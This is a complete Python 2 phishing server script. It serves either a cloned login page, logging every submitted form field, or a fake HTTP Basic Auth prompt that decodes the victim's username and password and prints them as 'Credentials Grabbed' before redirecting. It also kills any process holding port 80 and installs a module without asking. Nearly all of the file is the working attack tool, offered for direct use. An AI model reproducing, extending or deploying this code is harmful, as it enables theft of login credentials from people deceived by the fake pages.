import SimpleHTTPServer
import SocketServer
import socket
import os
import base64
import cgi

PORT = 80

class MainHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
	print("")
	def do_POST(self):
		try:
			form = cgi.FieldStorage(self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST', 'CONTENT_TYPE':self.headers['Content-Type'],})
			print("##################################")
			for tag in form.list:
				print("POST REQUEST: " + (str(tag).strip())[16:])
			print("##################################")
			self.send_response(302)
			self.send_header('Location', redirect)
			self.end_headers()
			print("Client redirected to " + redirect + "!")
		except:
			print("Error")

class RequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
	def do_GET(self):
		if str(self.headers).find('UserLogin=1') > 0:
			self.send_response(302)
			self.send_header('Location', redirect)
			self.end_headers()
		else:
			if str(self.headers).find('Authorization: Basic ') > 0:
				self.send_response(302)
				#self.send_header('Set-Cookie', 'UserLogin=1')
				self.send_header('Location', redirect)
				credsArray = str(self.headers).split("\n")
				for i in credsArray:
					if "Authorization:" in i:
						credsArray = i.split(" ")
						creds = credsArray[-1]
						creds = base64.decodestring(creds)
					if "Host:" in i:
						credsArray = i.split(" ")
						client = credsArray[-1]
				#print("\n###########################\n" + str(self.headers) + "###########################")
				print("\nCredentials Grabbed: " + creds + " from " + client + "\n")
			else:
				self.send_response(401)
				self.send_header('Content-type','text/html; charset=UTF-8')
				self.send_header('WWW-Authenticate', 'Basic realm="'+ statement +'"')
				self.end_headers()

def freePort():
	#########################################################################
	#os.system('sudo kill $(lsof -t -i :'+ str(PORT) +') > /dev/null 2>&1')
	#########################################################################
	#"""
	try:
		from psutil import process_iter
		from signal import SIGTERM
		from signal import SIGKILL
	except:
		print "Module \"psutil\" not installed. Installing...\n"
		os.system("pip install psutil")
		print("\n")
		try:
			from psutil import process_iter
			from signal import SIGTERM
			from signal import SIGKILL
			print("Module \"psutil\" installed successfully. Continuing...")
		except:
			print("Failed to install module \"psutil\". Continuing...")
	try:
		for proc in process_iter():
			for conns in proc.connections(kind='inet'):
				if conns.laddr.port == PORT:
					proc.send_signal(SIGTERM)
					proc.send_signal(SIGKILL)
	except:
		print("Failed to close port " + PORT)
	#"""
	#########################################################################

freePort()

print """ [1] - Normal phishing page
 
 [2] - HTTP Auth phishing page
"""

phishMode = input("Mode: ")
if phishMode == 1:
	serverDir = raw_input("Path to server folder: ")
	serving = os.path.basename(os.path.normpath(serverDir))
	Handler = MainHandler
	if serverDir != "":
		os.chdir(serverDir)
if phishMode == 2:
	statement = raw_input("Auth statement: ")
	Handler = RequestHandler
	serving = "HTTP Auth Phish"
redirect = raw_input("Redirect URL: ")
##################################

try:
	httpd = SocketServer.TCPServer(("", PORT), Handler)
	print "serving \"" + serving + "\" on port " + str(PORT)
	httpd.serve_forever()
except KeyboardInterrupt:
	print("\nShutting down web server...")
	httpd.shutdown()
	freePort()
	print("\nWeb server CLOSED...")
except socket.error:
	print("Error: Port " + str(PORT) + " in use! Closing...")
	exit()
